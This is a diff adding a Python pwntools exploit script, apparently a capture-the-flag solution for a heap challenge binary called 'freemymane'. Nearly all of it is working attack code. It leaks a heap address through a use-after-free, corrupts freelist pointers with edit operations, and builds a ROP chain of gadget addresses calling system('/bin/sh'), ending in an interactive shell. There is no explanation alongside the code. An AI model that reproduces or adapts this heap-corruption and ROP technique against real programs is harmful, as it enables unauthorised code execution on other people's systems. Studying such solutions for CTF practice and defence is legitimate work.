@@ -1,0 +1,107 @@
+#!/usr/bin/env python3
+from pwn import *
+import warnings
+warnings.filterwarnings("ignore")
+exe = ELF("./freemymane")
+# context.log_level='debug'
+# p = remote("addr", 1337)
+p = process([exe.path])
+def GDB():
+    context.terminal = ["foot"]
+    gdb.attach(p, gdbscript="""
+
+               """)
+    # p = gdb.debug([exe.path],"""
+    #
+    #                 """)
+
+sla = lambda msg, data: p.sendlineafter(msg, data)
+sa = lambda msg, data: p.sendafter(msg, data)
+sl = lambda data: p.sendline(data)
+s = lambda data: p.send(data)
+def show(idx):
+    sla(">>","3")
+    sla(":",str(idx))
+def addrq(title,content):
+    sla(">>","1")
+    sla(":",title)
+    sla(":",content)
+def adddata(title,content):
+    sla(">>","5")
+    sla(":",title)
+    sla(":",content) 
+def free(idx):
+    sla(">>","4")
+    sla(":",str(idx))
+def edit(idx,title, content):
+    sla(">>",'2')
+    sla(":",str(idx))
+    sla(":",title)
+    sla(":",content)
+# gdbs()
+addrq("lmaobrub1","lmaobrub1")
+addrq("lmaobrub2","lmaobrub2")
+addrq("lmaobrub3","lmaobrub3")
+free(1)
+# # show
+show(1)
+p.recvuntil("tle: ")
+addr = u64(p.recv(6).ljust(8,b"\0"))
+heap_lor = addr >> 4 << 12
+log.info(f"{hex(heap_lor) = }")
+target_heap = heap_lor + 0x20
+fwd = heap_lor + 0x140
+
+fakechunk = heap_lor + 0x1a0
+payload = b""
+payload += p64(fwd)[1:]
+payload = payload.ljust(0x40)
+bin_sh = heap_lor + 0x181
+# payload +=p64(fwd)
+edit(1,payload,"aaaaa")
+edit(2,b"".ljust(7)+b"lmaobrub2",b"a"*0x1f+p64(0x1213))
+#
+# pop_rsp
+pop_rdi = 0x0000000000403e95
+pop_rsp = 0x0000000000402ccc # pop rsp; pop rbx; ret;
+pop_rax = 0x0000000000413c23
+pop_rdx = 0x000000000041599a # out 6, al; add byte ptr [rax - 0x73], cl; and al, 0x18; ret;
+pop_rsi = 0x00000000004069f8
+syscall = 0x0000000000401085
+# call = 0x4591AB
+call = 0x000000000045c0d8
+# gdbs()
+gadget = heap_lor + 0x168 + 0x8
+system = 0x0000000004590B0
+
+addrq(payload,"lmaodarkdark")
+payload = b""
+payload += b"\0"*0x1f
+payload +=p64(gadget)
+payload += p64(pop_rdi)
+payload += p64(bin_sh)
+payload = payload.ljust(0x3e,b"a")
+payload2 = b"b"*(8+6+8) + p64(system) 
+payload2 = payload2.ljust(0x40,b"b")
+addrq(payload,payload2)
+edit(2,b"".ljust(7)+b"lmaobrub2",b"a"*0x1f+p64(0x1213)+p64(0))
+edit(3,b"/bin/sh\0".ljust(0x17,b"t")+b"a"*8,b"".ljust(0x16-8,b"t")+p64(call))
+addrq(payload,"")
+
+sla(">>",'3')
+GDB()
+sla(":","5")
+# sla(":",b"lmaobrub1".ljust(0x20,b"a")[1:]+p64(0x1780a1)+p64(target_heap))
+# sla(":","a")
+#
+# sla(">>","1")
+# sla(":","lmaobrub")
+# sla(":","a"*0x40)
+
+
+
+
+
+p.interactive()
+# good luck pwning :)
+
